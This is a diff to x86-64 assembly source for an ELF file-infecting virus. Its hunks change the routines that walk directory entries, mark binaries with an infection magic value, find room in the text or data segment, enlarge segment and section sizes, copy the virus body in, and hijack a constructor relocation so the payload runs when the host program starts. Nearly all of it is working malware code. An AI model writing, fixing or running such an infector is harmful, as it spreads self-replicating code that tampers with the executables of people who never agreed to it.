@@ -33,7 +33,7 @@ _start:
     add     eax, SYS_CLOSE
     syscall
     leave
-    pop    r12
+    pop     r12
     pop     rbx
     jmp     _end - 5
 
@@ -86,7 +86,7 @@ loop_buf_dirent:
 next_dirent:
     mov     r9, [rsp + 0x8]
     movzx   r8, WORD [rsp + 0x10]
-    add     r8w, [r9 + d_reclen]
+    add     r8w, [r9 + r8 + d_reclen]
     cmp     r8w, [rsp + 4]
     jl      loop_buf_dirent
     jmp     loop_dir
@@ -154,8 +154,8 @@ right_type_check:
     xor     r9, r9
     mov     eax, SYS_MMAP
     syscall
-    test    rax, rax
-    je      close_quit_infect
+    test    al, al
+    jnz     close_quit_infect
     mov     [rsp + map], rax
 
     mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection
@@ -214,6 +214,8 @@ test_init_array:
 test_bss:
     cmp     r9d, SHT_NOBITS
     jne     test_rela
+    test    QWORD [rax + sh_flags], SHF_TLS
+    jnz     test_rela
     mov     QWORD [rsp + bss_shdr_off], rax
     sub     QWORD [rsp + bss_shdr_off], rbx
 test_rela:
@@ -250,12 +252,12 @@ found_init_rela:
 check_text_padding:
     mov     r8, [rsp + map]
     mov     r9, r8
+    add     r9w, WORD [r8 + e_phentsize]
     add     r8, [rsp + text_phdr_off]
-    add     r9, [rsp + data_phdr_off]
+    add     r9, [rsp + text_phdr_off]
     mov     rbx, [r8 + p_offset]
     add     rbx, [r8 + p_filesz]
     mov     rax, [r9 + p_offset]
-    add     rax, [r9 + p_filesz]
     sub     rax, rbx
     cmp     rax, virus_len
     jle     remap_and_infect_data
@@ -277,6 +279,7 @@ increase_text_size:
     add     rax, [rsp + map]
     add     QWORD [rax + p_filesz], virus_len
     add     QWORD [rax + p_memsz], virus_len
+    mov     rax, [rsp + map]
     add     rax, [rsp + last_text_shdr_off]
     add     QWORD [rax + sh_size], virus_len
     mov     rdi, [rsp + payload_base_offset]
@@ -360,6 +363,8 @@ update_sizes:
     add     QWORD [rbx + p_filesz], virus_len
     add     [rbx + p_filesz], r10
     add     QWORD [rbx + p_memsz], virus_len
+    mov     r12, [rbx + p_memsz]
+    sub     r12, [rbx + p_filesz]
     add     QWORD [rax + sh_size], virus_len
     mov     DWORD [rax + sh_type], SHT_PROGBITS
 
@@ -387,6 +392,7 @@ copy_virus_in_data:
     mov     [rsp + payload_data_base_offset], rdx
     mov     rdx, [rax + sh_addr]
     add     rdx, r10
+    sub     rdx, r12
     mov     [rsp + payload_data_base_address], rdx
 
 format_text_code_chunk:
@@ -398,7 +404,7 @@ format_text_code_chunk:
     mov     r9, QWORD 0x1000
     div     r9
     sub     r8, rdx
-    mov     rcx, [rbx + p_memsz]
+    mov     rcx, [rbx + p_filesz]
     add     rcx, rdx
     mov     [data_len], rcx
     mov     rbx, [rsp + map]
@@ -448,7 +454,7 @@ hijack_constructor:
     add     r11, [rsp + init_rela_entry_off]
     mov     [r11 + r_addend], rdx
     add     rdi, [rsp + map]
-    add     rdi, virus_len - 4 ; let's override init_ptr with the old_init_ptr
+    add     rdi, virus_len - 4
     mov     rdx, [rsp + old_init_func]
     add     rsi, virus_len
     sub     rdx, rsi
